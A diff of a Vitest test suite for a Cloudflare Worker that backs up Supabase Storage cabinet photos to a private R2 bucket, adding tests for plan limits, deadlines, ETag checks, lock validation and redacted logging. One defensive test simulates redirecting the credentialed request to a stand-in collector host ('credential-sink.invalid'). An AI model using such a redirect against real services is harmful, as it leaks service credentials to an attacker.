@@ -1,14 +1,16 @@
 import { readFileSync } from 'node:fs'
 import { resolve } from 'node:path'
 import { describe, expect, it, vi } from 'vitest'
-import worker from './index'
+import worker, { runStorageBackupSchedule } from './index'
 import {
+  calculateWorstCaseSubrequests,
   isStorageBackupEnabled,
   parseLegacyPublicUrl,
   parseSourcePointer,
   parseStrictObjectPath,
   resolveSourceConfig,
   runScheduledBackup,
+  STORAGE_BACKUP_LIMITS,
   type BackupR2Bucket,
   type BackupRunResult,
   type RuntimeConfigKv,
@@ -187,9 +189,15 @@ class FakeR2 implements BackupR2Bucket {
 class FakeSource {
   pointers: PointerFixture[]
   objects: ObjectFixture[]
-  readonly fetchCalls: Array<{ url: string; method: string; headers: Headers }> = []
+  readonly fetchCalls: Array<{
+    url: string
+    method: string
+    headers: Headers
+    redirect: RequestRedirect | undefined
+  }> = []
   readonly downloadAttempts = new Map<string, number>()
   readonly downloadStatuses = new Map<string, number[]>()
+  readonly downloadEtagOverrides = new Map<string, string | null>()
   pointerPass = 0
   storagePass = 0
   pointersForPass?: (pass: number, current: PointerFixture[]) => PointerFixture[]
@@ -206,7 +214,8 @@ class FakeSource {
     const url = new URL(typeof input === 'string' ? input : input instanceof URL ? input : input.url)
     const method = init?.method ?? 'GET'
     const headers = new Headers(init?.headers)
-    this.fetchCalls.push({ url: url.toString(), method, headers })
+    this.fetchCalls.push({ url: url.toString(), method, headers, redirect: init?.redirect })
+    expect(init?.redirect).toBe('error')
     if (this.throwOnRequest) {
       throw new Error('private-user@example.invalid /private/path 77777777-7777-4777-8777-777777777777 secret-token')
     }
@@ -295,13 +304,17 @@ class FakeSource {
     if (status !== 200) return new Response(null, { status })
     const object = this.objects.find((candidate) => candidate.path === path)
     if (!object) return new Response(null, { status: 404 })
+    const headers = new Headers({
+      'content-length': String(object.body.byteLength),
+      'content-type': object.contentType ?? 'image/jpeg',
+    })
+    const responseEtag = this.downloadEtagOverrides.has(path)
+      ? this.downloadEtagOverrides.get(path)
+      : `"${object.etag}"`
+    if (responseEtag !== null && responseEtag !== undefined) headers.set('etag', responseEtag)
     return new Response(object.body.slice(), {
       status: 200,
-      headers: {
-        'content-length': String(object.body.byteLength),
-        'content-type': object.contentType ?? 'image/jpeg',
-        etag: `"${object.etag}"`,
-      },
+      headers,
     })
   }
 }
@@ -366,6 +379,8 @@ function bindings(
     SOURCE_POINTER_MODE: 'legacy_url',
     SOURCE_STORAGE_BUCKET: 'cabinets',
     SUPABASE_SERVICE_ROLE_KEY: TEST_SECRET,
+    WORKERS_SUBREQUEST_LIMIT: '700',
+    WORKERS_USAGE_PLAN: 'paid',
     ...overrides,
   }
 }
@@ -458,6 +473,61 @@ describe('OFF-first activation and environment isolation', () => {
     await expect(isStorageBackupEnabled(new FakeKv({ storage_backup_enabled: 1 }))).resolves.toBe(false)
   })
 
+  it('refuses an enabled run on the committed Free OFF-only execution profile', async () => {
+    const fixtures = validFixtures()
+    const source = new FakeSource(fixtures.pointers, fixtures.objects)
+    const kv = new FakeKv({ storage_backup_enabled: true })
+    const r2 = new FakeR2()
+    const result = await runScheduledBackup(bindings(kv, r2, {
+      WORKERS_SUBREQUEST_LIMIT: '50',
+      WORKERS_USAGE_PLAN: 'free_off_only',
+    }), testOverrides(source))
+
+    expect(result).toMatchObject({ status: 'failed', code: 'workers_paid_plan_required' })
+    expect(kv.get).toHaveBeenCalledTimes(1)
+    expect(source.fetchCalls).toHaveLength(0)
+    expect(r2.headCalls).toHaveLength(0)
+    expect(r2.putCalls).toHaveLength(0)
+  })
+
+  it('rejects unsupported plan claims and mismatched declared subrequest limits', () => {
+    const kv = new FakeKv()
+    const r2 = new FakeR2()
+    expect(() => resolveSourceConfig(bindings(kv, r2, {
+      WORKERS_USAGE_PLAN: 'standard',
+    }))).toThrow('config_invalid')
+    expect(() => resolveSourceConfig(bindings(kv, r2, {
+      WORKERS_SUBREQUEST_LIMIT: '699',
+    }))).toThrow('config_invalid')
+    expect(() => resolveSourceConfig(bindings(kv, r2, {
+      WORKERS_SUBREQUEST_LIMIT: '700',
+      WORKERS_USAGE_PLAN: 'free_off_only',
+    }))).toThrow('config_invalid')
+  })
+
+  it('blocks Supabase redirects before credentials can reach another origin', async () => {
+    const fixtures = validFixtures()
+    const source = new FakeSource(fixtures.pointers, fixtures.objects)
+    const externalCalls: Array<{ url: string; headers: Headers }> = []
+    const redirectingFetch: typeof fetch = async function redirectingFetch(input, init) {
+      const url = new URL(typeof input === 'string' ? input : input instanceof URL ? input : input.url)
+      if (url.origin === STAGING_ORIGIN) {
+        if (init?.redirect === 'error') throw new TypeError('redirect blocked')
+        return redirectingFetch('https://credential-sink.invalid/collect', init)
+      }
+      externalCalls.push({ url: url.toString(), headers: new Headers(init?.headers) })
+      return Response.json([])
+    }
+
+    const result = await runScheduledBackup(bindings(new FakeKv(), new FakeR2()), {
+      ...testOverrides(source),
+      fetch: redirectingFetch,
+    })
+
+    expect(result).toMatchObject({ status: 'failed', code: 'source_request_failed' })
+    expect(externalCalls).toHaveLength(0)
+  })
+
   it('pins distinct worker, KV, R2, ref, and cron configuration without secrets', () => {
     const staging = JSON.parse(readFileSync(resolve('workers/storage-backup/wrangler.staging.jsonc'), 'utf8')) as Record<string, unknown>
     const production = JSON.parse(readFileSync(resolve('workers/storage-backup/wrangler.production.jsonc'), 'utf8')) as Record<string, unknown>
@@ -470,16 +540,66 @@ describe('OFF-first activation and environment isolation', () => {
       preview_urls: false,
       kv_namespaces: [{ binding: 'BURILLAB_RUNTIME_CONFIG', id: 'dcaa52254fa6447bbe7c21f54354ad0d' }],
       r2_buckets: [{ binding: 'CABINET_BACKUPS', bucket_name: 'buril-lab-cabinet-backups-staging' }],
-      vars: { BACKUP_ENVIRONMENT: 'staging', SUPABASE_PROJECT_REF: STAGING_REF },
+      vars: {
+        BACKUP_ENVIRONMENT: 'staging',
+        SUPABASE_PROJECT_REF: STAGING_REF,
+        WORKERS_SUBREQUEST_LIMIT: '50',
+        WORKERS_USAGE_PLAN: 'free_off_only',
+      },
     })
     expect(production).toMatchObject({
       workers_dev: false,
       preview_urls: false,
       kv_namespaces: [{ binding: 'BURILLAB_RUNTIME_CONFIG', id: 'dd6866f35f794a91b0fb5a24cbe57cf3' }],
       r2_buckets: [{ binding: 'CABINET_BACKUPS', bucket_name: 'buril-lab-cabinet-backups-production' }],
-      vars: { BACKUP_ENVIRONMENT: 'production', SUPABASE_PROJECT_REF: 'zafxzidbtbryiksemlwc' },
+      vars: {
+        BACKUP_ENVIRONMENT: 'production',
+        SUPABASE_PROJECT_REF: 'zafxzidbtbryiksemlwc',
+        WORKERS_SUBREQUEST_LIMIT: '50',
+        WORKERS_USAGE_PLAN: 'free_off_only',
+      },
     })
+    expect(staging).not.toHaveProperty('limits')
+    expect(production).not.toHaveProperty('limits')
     expect(staging.triggers).not.toEqual(production.triggers)
+  })
+
+  it('keeps the supported paid-plan ceiling above the exact static worst case', () => {
+    const worstCase = calculateWorstCaseSubrequests({ ...STORAGE_BACKUP_LIMITS })
+
+    expect(STORAGE_BACKUP_LIMITS.maxPointers).toBe(50)
+    expect(STORAGE_BACKUP_LIMITS.maxStorageObjects).toBe(50)
+    expect(worstCase).toBe(625)
+    expect(worstCase).toBeLessThan(STORAGE_BACKUP_LIMITS.maxSubrequests)
+    expect(() => resolveSourceConfig(
+      bindings(new FakeKv(), new FakeR2()),
+      { ...STORAGE_BACKUP_LIMITS, maxSubrequests: worstCase - 1 },
+    )).toThrow('config_invalid')
+  })
+
+  it('stops before any subrequest at the exact 15-minute invocation boundary', async () => {
+    const fixtures = validFixtures()
+    const source = new FakeSource(fixtures.pointers, fixtures.objects)
+    const kv = new FakeKv()
+    const r2 = new FakeR2()
+    let clockReads = 0
+    const result = await runScheduledBackup(bindings(kv, r2), {
+      ...testOverrides(source),
+      now: () => {
+        clockReads += 1
+        return clockReads === 1 ? FIXED_NOW : FIXED_NOW + (15 * 60_000)
+      },
+      limits: {
+        dbPageSize: 2,
+        storagePageSize: 2,
+        maxRunDurationMs: 15 * 60_000,
+      },
+    })
+
+    expect(result).toMatchObject({ status: 'failed', code: 'execution_deadline_exceeded' })
+    expect(kv.get).not.toHaveBeenCalled()
+    expect(source.fetchCalls).toHaveLength(0)
+    expect(r2.headCalls).toHaveLength(0)
   })
 
   it('pins the reviewed private R2 retention contract without covering control keys', () => {
@@ -493,24 +613,77 @@ describe('OFF-first activation and environment isolation', () => {
       publicAccess: false,
       customDomain: false,
       publicDevelopmentUrl: false,
-      lifecycle: {
-        name: 'expire-snapshots-31-days',
-        prefix: 'snapshots/',
-        deleteAfterDays: 31,
-        abortMultipartUploadsAfterDays: 1,
+      requiredUserPolicies: {
+        lifecycle: {
+          name: 'expire-snapshots-31-days',
+          prefix: 'snapshots/',
+          deleteAfterDays: 31,
+          abortMultipartUploadsAfterDays: 1,
+        },
+        bucketLock: {
+          name: 'retain-snapshots-30-days',
+          prefix: 'snapshots/',
+          retainForDays: 30,
+        },
       },
-      bucketLock: {
-        name: 'retain-snapshots-30-days',
-        prefix: 'snapshots/',
-        retainForDays: 30,
-      },
-      controlPrefixExcluded: true,
+      allowedCloudflareManagedRules: [{
+        name: 'Default Multipart Abort Rule',
+        prefix: '',
+        abortMultipartUploadsAfterDays: 7,
+        multipartOnly: true,
+      }],
+      controlPrefixExcludedFromUserPolicies: true,
+      rejectOtherRules: true,
     })
   })
 
   it('exports only the scheduled handler and no public fetch path', () => {
     expect(Object.keys(worker)).toEqual(['scheduled'])
     expect(worker).not.toHaveProperty('fetch')
+  })
+
+  it.each([
+    ['disabled', 'backup_disabled'],
+    ['skipped', 'backup_locked'],
+    ['completed', 'backup_completed'],
+  ] as const)('resolves a %s scheduled result normally', async (status, code) => {
+    await expect(runStorageBackupSchedule({}, async () => ({
+      status,
+      code,
+      count: 0,
+      bytes: 0,
+      durationMs: 0,
+      orphanCount: 0,
+    }))).resolves.toBeUndefined()
+  })
+
+  it('throws only a safe code when a scheduled backup returns failed', async () => {
+    await expect(runStorageBackupSchedule({}, async () => ({
+      status: 'failed',
+      code: 'source_request_failed',
+      count: 0,
+      bytes: 0,
+      durationMs: 0,
+      orphanCount: 0,
+    }))).rejects.toThrow(/^storage_backup_failed:source_request_failed$/)
+  })
+
+  it('replaces an unexpected scheduled rejection with a non-identifying code', async () => {
+    await expect(runStorageBackupSchedule({}, async () => {
+      throw new Error('private-user@example.invalid /private/path secret-token')
+    })).rejects.toThrow(/^storage_backup_failed:unexpected_failure$/)
+  })
+
+  it('makes the actual scheduled entrypoint reject when configuration fails', async () => {
+    const log = vi.spyOn(console, 'log').mockImplementation(() => undefined)
+    try {
+      await expect(worker.scheduled(
+        {} as ScheduledController,
+        {} as Env,
+      )).rejects.toThrow(/^storage_backup_failed:config_invalid$/)
+    } finally {
+      log.mockRestore()
+    }
   })
 })
 
@@ -554,6 +727,46 @@ describe('strict source pointer parsing', () => {
     'file.jpg\u0000',
   ])('rejects a private-path bypass: %s', (value) => {
     expect(() => parseStrictObjectPath(value)).toThrow('pointer_invalid')
+  })
+})
+
+describe('cabinet pointer query contract', () => {
+  it('skips only an exact empty image_url as a cabinet with no photo', async () => {
+    const fixtures = validFixtures()
+    const source = new FakeSource([
+      ...fixtures.pointers,
+      {
+        id: '77777777-7777-4777-8777-777777777777',
+        lab_id: LAB_A,
+        user_id: USER_A,
+        image_url: '',
+      },
+    ], fixtures.objects)
+    const { result } = await runFixture(source)
+
+    expect(result).toMatchObject({
+      status: 'completed',
+      code: 'backup_completed',
+      count: fixtures.objects.length,
+      orphanCount: 0,
+    })
+    const query = new URL(source.fetchCalls.find((call) => call.url.includes('/rest/v1/cabinets'))?.url ?? '')
+    expect(query.searchParams.get('image_url')).toBe('not.is.null')
+    expect(query.searchParams.get('select')).toBe('id,lab_id,user_id,image_url')
+  })
+
+  it.each([
+    ['whitespace', '   ', 'pointer_invalid'],
+    ['non-string raw value', null, 'source_contract_invalid'],
+  ] as const)('fails closed for a %s image_url returned by the Data API', async (_label, value, code) => {
+    const fixtures = validFixtures()
+    const changed = fixtures.pointers.map((item, index) => (
+      index === 0 ? { ...item, image_url: value as unknown as string } : item
+    ))
+    const { result, r2 } = await runFixture(new FakeSource(changed, fixtures.objects))
+
+    expect(result.code).toBe(code)
+    expect(completeKeys(r2)).toHaveLength(0)
   })
 })
 
@@ -709,13 +922,9 @@ describe('snapshot creation and consistency barriers', () => {
       pointers,
       objects: objects.slice(1),
     })],
-    ['orphan object', 'source_orphan_object', (pointers: PointerFixture[], objects: ObjectFixture[]) => ({
-      pointers: pointers.slice(1),
-      objects,
-    })],
-    ['both owner scopes', 'ownership_ambiguous', (pointers: PointerFixture[], objects: ObjectFixture[]) => ({
-      pointers: pointers.map((item, index) => index === 0 ? pointer(item.id, objects[0].path, 'both') : item),
-      objects,
+    ['duplicate Storage UUID', 'source_drift', (pointers: PointerFixture[], objects: ObjectFixture[]) => ({
+      pointers,
+      objects: objects.map((item, index) => index === 1 ? { ...item, id: objects[0].id } : item),
     })],
     ['no owner scope', 'ownership_ambiguous', (pointers: PointerFixture[], objects: ObjectFixture[]) => ({
       pointers: pointers.map((item, index) => index === 0 ? pointer(item.id, objects[0].path, 'none') : item),
@@ -730,6 +939,75 @@ describe('snapshot creation and consistency barriers', () => {
     expect(completeKeys(r2)).toHaveLength(0)
   })
 
+  it('uses lab ownership when the cabinet model contains both lab_id and user_id', async () => {
+    const fixtures = validFixtures()
+    const pointers = fixtures.pointers.map((item, index) => (
+      index === 0 ? pointer(item.id, fixtures.objects[0].path, 'both') : item
+    ))
+    const source = new FakeSource(pointers, fixtures.objects)
+    const { result, r2 } = await runFixture(source)
+
+    expect(result.status).toBe('completed')
+    const manifestKey = [...r2.objects.keys()].find((key) => key.endsWith('/manifest.json'))
+    const manifest = JSON.parse(r2.text(manifestKey as string)) as {
+      objects: Array<{ sourcePath: string; ownerScope: string }>
+    }
+    expect(manifest.objects.find((item) => item.sourcePath === fixtures.objects[0].path)).toMatchObject({
+      ownerScope: 'lab',
+    })
+  })
+
+  it('quarantines an unreferenced Storage object without owner identifiers', async () => {
+    const fixtures = validFixtures()
+    const source = new FakeSource(fixtures.pointers.slice(1), fixtures.objects)
+    const logs: SafeLogEntry[] = []
+    const { result, r2 } = await runFixture(source, { logs })
+
+    expect(result).toMatchObject({
+      status: 'completed',
+      code: 'backup_completed_with_quarantine',
+      count: 3,
+      orphanCount: 1,
+    })
+    expect(logs).toHaveLength(1)
+    expect(logs[0].orphanCount).toBe(1)
+
+    const manifestKey = [...r2.objects.keys()].find((key) => key.endsWith('/manifest.json'))
+    const manifestText = r2.text(manifestKey as string)
+    const manifest = JSON.parse(manifestText) as {
+      referencedObjectCount: number
+      orphanCount: number
+      objects: Array<Record<string, unknown>>
+    }
+    expect(manifest).toMatchObject({ referencedObjectCount: 2, orphanCount: 1 })
+    const orphan = manifest.objects.find((item) => item.classification === 'unreferenced')
+    expect(orphan).toMatchObject({
+      sourcePath: fixtures.objects[0].path,
+      classification: 'unreferenced',
+    })
+    expect(orphan).not.toHaveProperty('ownerScope')
+    expect(String(orphan?.backupKey)).toContain('/quarantine/unreferenced/')
+    expect(manifestText).not.toMatch(/labId|userId|email|reagent|laboratory/i)
+
+    const completeKey = [...r2.objects.keys()].find((key) => key.endsWith('/complete.json'))
+    expect(JSON.parse(r2.text(completeKey as string))).toMatchObject({
+      referencedObjectCount: 2,
+      orphanCount: 1,
+    })
+  })
+
+  it('can preserve an orphan-only bucket after all cabinet photos are cleared', async () => {
+    const fixtures = validFixtures()
+    const { result } = await runFixture(new FakeSource([], fixtures.objects))
+
+    expect(result).toMatchObject({
+      status: 'completed',
+      code: 'backup_completed_with_quarantine',
+      count: 3,
+      orphanCount: 3,
+    })
+  })
+
   it('rejects an empty bucket as a backup, not as a successful snapshot', async () => {
     const source = new FakeSource([], [])
     const { result, r2 } = await runFixture(source)
@@ -742,6 +1020,11 @@ describe('snapshot creation and consistency barriers', () => {
     const source = new FakeSource(fixtures.pointers, fixtures.objects)
     const kv = new FakeKv(
       { storage_backup_enabled: true },
+      { storage_backup_enabled: true },
+      { storage_backup_enabled: true },
+      { storage_backup_enabled: true },
+      { storage_backup_enabled: true },
+      { storage_backup_enabled: true },
       { storage_backup_enabled: false },
     )
     const { result, r2 } = await runFixture(source, { kv })
@@ -749,9 +1032,74 @@ describe('snapshot creation and consistency barriers', () => {
     expect(completeKeys(r2)).toHaveLength(0)
     expect(r2.objects.has('control/latest.json')).toBe(false)
   })
+
+  it('stops before the next object write when the runtime flag turns OFF', async () => {
+    const fixtures = validFixtures()
+    const source = new FakeSource(fixtures.pointers, fixtures.objects)
+    const kv = new FakeKv(
+      { storage_backup_enabled: true },
+      { storage_backup_enabled: true },
+      { storage_backup_enabled: false },
+    )
+    const { result, r2 } = await runFixture(source, { kv })
+
+    expect(result.code).toBe('flag_disabled_before_complete')
+    const copiedBodies = [...r2.objects.keys()].filter((key) => key.includes('/objects/'))
+    const firstPath = [...fixtures.objects]
+      .sort((left, right) => left.path.localeCompare(right.path, 'en'))[0].path
+    expect(copiedBodies).toEqual([expectSnapshotObjectKey(firstPath)])
+    expect([...r2.objects.keys()].some((key) => key.endsWith('/manifest.json'))).toBe(false)
+    expect(completeKeys(r2)).toHaveLength(0)
+  })
 })
 
 describe('network, R2, checksum, and lock failures', () => {
+  it('uses the reserved cleanup path to release a lock after the run deadline', async () => {
+    const fixtures = validFixtures()
+    const source = new FakeSource(fixtures.pointers, fixtures.objects)
+    const r2 = new FakeR2()
+    const { result } = await runFixture(source, {
+      r2,
+      dependencyOverrides: {
+        now: () => r2.objects.get('control/active-lock.json')?.customMetadata?.['lock-state'] === 'active'
+          && r2.headCalls.length >= 3
+          ? FIXED_NOW + STORAGE_BACKUP_LIMITS.maxRunDurationMs
+          : FIXED_NOW,
+      },
+    })
+
+    expect(result).toMatchObject({ status: 'failed', code: 'execution_deadline_exceeded' })
+    expect(source.fetchCalls).toHaveLength(0)
+    expect(r2.objects.get('control/active-lock.json')?.customMetadata?.['lock-state']).toBe('released')
+    expect(r2.putCalls.filter((call) => call.key === 'control/active-lock.json')).toHaveLength(2)
+    expect(completeKeys(r2)).toHaveLength(0)
+  })
+
+  it('rejects a missing or invalid ETag in the Storage listing contract', async () => {
+    const fixtures = validFixtures()
+    const source = new FakeSource(fixtures.pointers, fixtures.objects)
+    source.objects[0] = { ...source.objects[0], etag: 'invalid etag' }
+    const { result, r2 } = await runFixture(source)
+
+    expect(result.code).toBe('source_contract_invalid')
+    expect(source.downloadAttempts.size).toBe(0)
+    expect(completeKeys(r2)).toHaveLength(0)
+  })
+
+  it.each([
+    ['missing', null, 'object_download_invalid'],
+    ['invalid', 'invalid etag', 'object_download_invalid'],
+    ['different', 'different-valid-etag', 'source_drift'],
+  ] as const)('requires an exact %s download ETag', async (_label, etag, expectedCode) => {
+    const fixtures = validFixtures()
+    const source = new FakeSource(fixtures.pointers, fixtures.objects)
+    source.downloadEtagOverrides.set(fixtures.objects[0].path, etag)
+    const { result, r2 } = await runFixture(source)
+
+    expect(result.code).toBe(expectedCode)
+    expect(completeKeys(r2)).toHaveLength(0)
+  })
+
   it('retries bounded 429 and 5xx downloads and then completes', async () => {
     const fixtures = validFixtures()
     const source = new FakeSource(fixtures.pointers, fixtures.objects)
@@ -836,11 +1184,29 @@ describe('network, R2, checksum, and lock failures', () => {
     const r2 = new FakeR2()
     await r2.seed('control/active-lock.json', '{}', {
       'lock-state': 'active',
-      'lock-token': 'existing-token',
-      'expires-at': '2026-08-25T12:30:00.000Z',
+      'lock-token': 'a'.repeat(32),
+      'acquired-at': '2026-08-25T11:59:00.000Z',
+      'expires-at': '2026-08-25T12:29:00.000Z',
     })
     const { result } = await runFixture(source, { r2 })
     expect(result).toMatchObject({ status: 'skipped', code: 'backup_locked' })
+    expect(source.fetchCalls).toHaveLength(0)
+  })
+
+  it('emits a distinct safe code for a repeatedly long-running active lock', async () => {
+    const fixtures = validFixtures()
+    const source = new FakeSource(fixtures.pointers, fixtures.objects)
+    const r2 = new FakeR2()
+    await r2.seed('control/active-lock.json', '{}', {
+      'lock-state': 'active',
+      'lock-token': 'b'.repeat(32),
+      'acquired-at': '2026-08-25T11:40:00.000Z',
+      'expires-at': '2026-08-25T12:10:00.000Z',
+    })
+    const { result, logs } = await runFixture(source, { r2 })
+
+    expect(result).toMatchObject({ status: 'skipped', code: 'backup_locked_extended' })
+    expect(logs[0]).toMatchObject({ code: 'backup_locked_extended' })
     expect(source.fetchCalls).toHaveLength(0)
   })
 
@@ -850,6 +1216,8 @@ describe('network, R2, checksum, and lock failures', () => {
     const r2 = new FakeR2()
     await r2.seed('control/active-lock.json', '{}', {
       'lock-state': 'released',
+      'lock-token': 'c'.repeat(32),
+      'acquired-at': '2026-08-25T10:45:00.000Z',
       'expires-at': '2026-08-25T11:00:00.000Z',
     })
     const oldEtag = (await r2.head('control/active-lock.json'))?.etag
@@ -875,6 +1243,42 @@ describe('network, R2, checksum, and lock failures', () => {
     expect(race.result).toMatchObject({ status: 'skipped', code: 'backup_locked' })
     expect(raceSource.fetchCalls).toHaveLength(0)
   })
+
+  it.each([
+    ['future acquisition', {
+      'lock-state': 'active',
+      'lock-token': 'd'.repeat(32),
+      'acquired-at': '2026-08-25T13:00:00.000Z',
+      'expires-at': '2026-08-25T13:30:00.000Z',
+    }],
+    ['excessive TTL', {
+      'lock-state': 'active',
+      'lock-token': 'e'.repeat(32),
+      'acquired-at': '2026-08-25T11:59:00.000Z',
+      'expires-at': '2026-08-25T12:40:00.000Z',
+    }],
+    ['invalid token', {
+      'lock-state': 'active',
+      'lock-token': 'not-a-token',
+      'acquired-at': '2026-08-25T11:59:00.000Z',
+      'expires-at': '2026-08-25T12:29:00.000Z',
+    }],
+    ['invalid state', {
+      'lock-state': 'unknown',
+      'lock-token': 'f'.repeat(32),
+      'acquired-at': '2026-08-25T11:59:00.000Z',
+      'expires-at': '2026-08-25T12:29:00.000Z',
+    }],
+  ] as const)('fails instead of skipping a malformed %s lock', async (_label, metadata) => {
+    const fixtures = validFixtures()
+    const source = new FakeSource(fixtures.pointers, fixtures.objects)
+    const r2 = new FakeR2()
+    await r2.seed('control/active-lock.json', '{}', { ...metadata })
+    const { result } = await runFixture(source, { r2 })
+
+    expect(result).toMatchObject({ status: 'failed', code: 'lock_invalid' })
+    expect(source.fetchCalls).toHaveLength(0)
+  })
 })
 
 describe('safe logging', () => {
@@ -887,7 +1291,13 @@ describe('safe logging', () => {
 
     expect(result.code).toBe('source_request_failed')
     expect(logs).toHaveLength(1)
-    expect(Object.keys(logs[0]).sort()).toEqual(['bytes', 'code', 'count', 'durationMs'])
+    expect(Object.keys(logs[0]).sort()).toEqual([
+      'bytes',
+      'code',
+      'count',
+      'durationMs',
+      'orphanCount',
+    ])
     const serialized = JSON.stringify(logs)
     expect(serialized).not.toContain('private-user@example.invalid')
     expect(serialized).not.toContain('/private/path')
